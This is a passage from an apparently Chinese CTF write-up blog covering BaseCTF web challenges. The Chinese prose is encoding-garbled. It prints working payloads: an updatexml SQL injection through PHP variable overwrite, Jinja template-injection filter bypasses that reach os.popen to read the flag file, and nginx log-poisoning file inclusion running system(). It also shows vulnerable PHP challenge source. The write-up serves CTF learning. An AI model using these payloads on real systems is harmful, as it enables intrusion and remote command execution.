class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;è¿æ¥æ•°æ®åº“å¤±è´¥&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT COUNT(*) FROM users&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$row</span>[<span class="string">&#x27;COUNT(*)&#x27;</span>] + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$conn</span>-&gt;error);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;msg&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;msg&#x27;</span>] !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">replace_bad_word</span>(<span class="title function_ invoke__">convert</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO users VALUES(<span class="subst">$id</span>,&#x27;&quot;</span> . <span class="variable">$msg</span> . <span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;error)</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$conn</span>-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;Welcome come to SEC message board&lt;/center&gt;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;center&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Leave a message: &lt;input type=&quot;text&quot; name=&quot;msg&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;message&lt;/th&gt;&lt;tr&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_row</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;th&gt;<span class="subst">$row</span>[0]&lt;/th&gt;&lt;th&gt;<span class="subst">$row</span>[1]&lt;/th&gt;&lt;tr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å˜é‡è¦†ç›–</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$method</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯»å–ä¼ é€’çš„å‚æ•°èµ‹å€¼ç»™keyï¼Œå½“$keyä¸ºsqlçš„æ—¶å€™ï¼Œå°±ç›¸å½“äº$sql&#x3D;xxxxï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†éœ€è¦çš„sqlè¯­å¥æ‹¼æ¥</p>
<p>ç„¶åçœ‹sqlè¯­å¥ï¼Œç”±äº<code>$sql = &quot;SELECT * FROM users&quot;;</code>æ„Ÿè§‰åº”è¯¥ä¸æ˜¯äºŒæ¬¡æ³¨å…¥</p>
<p>insertæ³¨å…¥ä¸æ”¯æŒand whereç­‰ï¼Œä¹Ÿä¸è€ƒè™‘å †å ç­‰ï¼Œæ²¡æœ‰åŸé¢˜ï¼Œæœ¬åœ°ç¯å¢ƒè®¾ç½®ä¸¤åˆ—ï¼Œé‚£ä¹ˆç¬¬äºŒåˆ—ä½¿ç”¨oræ‹¼æ¥</p>
<p>æœ€ç»ˆpayload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">limit_words[sql]=11&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;&#x27;);#</span><br><span class="line">&amp;msg=sql</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240912164355753.png" alt="image-20240912164355753"></p>
<h2 id="BaseCTF-å¤è¯»æœº"><a href="#BaseCTF-å¤è¯»æœº" class="headerlink" title="BaseCTF å¤è¯»æœº"></a>BaseCTF å¤è¯»æœº</h2><p>fuzz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ - * / . &#123;&#123; &#125;&#125; __ : &quot; \</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº† <code>.</code> ï¼Œå¯ä»¥ç”¨ä¸­æ‹¬å·ç»•ï¼Œè¿‡æ»¤äº†å…³é”®å­—ï¼Œå¯ä»¥åœ¨å…³é”®å­—ä¸­é—´æ’å…¥ä¸€å¯¹å•å¼•å· <code>&#39;&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%print(&#x27;&#x27;[&#x27;_&#x27;&#x27;_cl&#x27;&#x27;ass_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;])%&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&lt;class &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%print(&#x27;&#x27;[&#x27;_&#x27;&#x27;_cl&#x27;&#x27;ass_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()[137])%&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&lt;class &#x27;os._wrap_close&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨è¿™ä¸ªç±»é‡Œçš„ <code>popen</code> å‡½æ•°æ¥ RCE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%print(&#x27;&#x27;[&#x27;_&#x27;&#x27;_cl&#x27;&#x27;ass_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()[137][&#x27;_&#x27;&#x27;_in&#x27;&#x27;it_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;po&#x27;&#x27;pen&#x27;](&#x27;pwd&#x27;)[&#x27;rea&#x27;&#x27;d&#x27;]())%&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºè¿‡æ»¤äº†æ–œæ å’Œåæ–œæ ï¼Œæ— æ³•ç›´æ¥è·³åˆ°æ ¹ç›®å½•ï¼Œè¿™é‡Œæä¾›ä¸‰ä¸ªæ–¹æ³•æ¥è·å–æ–œæ æ¥è·³åˆ°æ ¹ç›®å½•</p>
<p>æ³•ä¸€ï¼šåˆ©ç”¨ chr å‡½æ•°æ¥æ„é€ å‡ºä¸€ä¸ªå‘½ä»¤</p>
<p>å…ˆæ‰¾åˆ° chr</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;% set chr= <span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_bui&#x27;</span><span class="string">&#x27;ltins_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;chr&#x27;</span>]%&#125;</span><br><span class="line">&#123;% <span class="built_in">print</span>(chr) %&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ç€ç”¨ chr æ­é…ä¸Šæ•°å­—æ„é€ å‡ºæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;% set chr= <span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_bui&#x27;</span><span class="string">&#x27;ltins_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;chr&#x27;</span>]%&#125;</span><br><span class="line">&#123;% set cmd=<span class="string">&#x27;cat &#x27;</span>~chr(<span class="number">47</span>)~<span class="string">&#x27;flag&#x27;</span> %&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](cmd)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åæŠŠ cmd ä½œä¸º popen çš„å‚æ•°ä¼ é€’è¿›å»ï¼Œå³å¯å¾—åˆ° flag</p>
<p>åŒç†ï¼Œåˆ©ç”¨ format æ¥å¾—åˆ° <code>/</code> ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;% set cmd=<span class="string">&#x27;cat &#x27;</span>~<span class="string">&#x27;%c&#x27;</span>%(<span class="number">47</span>)~<span class="string">&#x27;flag&#x27;</span> %&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](cmd)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure>

<p>æ³•äºŒï¼šåˆ©ç”¨ç¯å¢ƒå˜é‡çš„å€¼</p>
<p>æŸ¥çœ‹ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥çœ‹åˆ° <code>OLDPWD=/</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;env&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å¯ä»¥ç›´æ¥åˆ©ç”¨å®ƒæ¥åˆ‡æ¢åˆ°æ ¹ç›®å½•ï¼Œç„¶åå†è¯»flag</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;cd $OLDPWD;cat flag&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure>

<p>æ³•ä¸‰ï¼šåˆ©ç”¨ <code>expr substr</code> åˆ‡å‰²å‡ºä¸€ä¸ª <code>/</code></p>
<p>æ¯”å¦‚ pwd ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å°±æ˜¯ <code>/</code> ï¼Œé‚£ç”¨ <code>expr substr</code> åˆ‡å‰²å‡ºæ¥åï¼Œä¹‹åå°±å¯ä»¥åƒæ³•äºŒé‚£æ ·åˆ‡æ¢åˆ°æ ¹ç›®å½•ç„¶åè¯» flag äº†</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;a=`pwd`;a=`substr $a 1 1`;cd $a;cat flag&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure>



<h2 id="BaseCTF-æ»¤ä¸ªä¸åœ"><a href="#BaseCTF-æ»¤ä¸ªä¸åœ" class="headerlink" title="BaseCTF æ»¤ä¸ªä¸åœ"></a>BaseCTF æ»¤ä¸ªä¸åœ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$incompetent</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;incompetent&#x27;</span>];</span><br><span class="line"><span class="variable">$Datch</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Datch&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$incompetent</span> !== <span class="string">&#x27;HelloWorld&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;å†™å‡ºç¨‹åºå‘˜çš„ç¬¬ä¸€è¡Œé—®å€™å§ï¼&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œä¸œï¼Ÿï¼Ÿï¼Ÿ</span></span><br><span class="line"><span class="variable">$required_chars</span> = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="variable">$is_valid</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$required_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$Datch</span>, <span class="variable">$char</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$is_valid</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$is_valid</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$invalid_patterns</span> = [<span class="string">&#x27;php://&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>, <span class="string">&#x27;ftp://&#x27;</span>, <span class="string">&#x27;file://&#x27;</span> , <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;gopher://&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$invalid_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$Datch</span>, <span class="variable">$pattern</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;æ­¤è·¯ä¸é€šæ¢æ¡è·¯è¯•è¯•?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$Datch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;æ–‡ä»¶åä¸åˆè§„ è¯·é‡è¯•&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ—¥å¿—æ³¨å…¥ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incompetent=HelloWorld&amp;Datch=/var/log/nginx/access.log&amp;1=system(&#x27;nl /flag&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240915144422260.png" alt="image-20240915144422260"></p>
<h2 id="BaseCTF-EZ-PHP-Jail"><a href="#BaseCTF-EZ-PHP-Jail" class="headerlink" title="BaseCTF EZ_PHP_Jail"></a>BaseCTF EZ_PHP_Jail</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;hint.html&quot;</span>);</span><br><span class="line"><span class="variable">$Jail</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Jail_by.Happy&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$Jail</span> == <span class="literal">null</span>) <span class="keyword">die</span>(<span class="string">&quot;Do You Like My Jail?&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Like_Jail</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(`|\$|a|c|s|require|include)/i&#x27;</span>, <span class="variable">$var</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">Like_Jail</span>(<span class="variable">$Jail</span>)) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$Jail</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Yes! you escaped from the jail! LOL!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You will Jail in your life!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 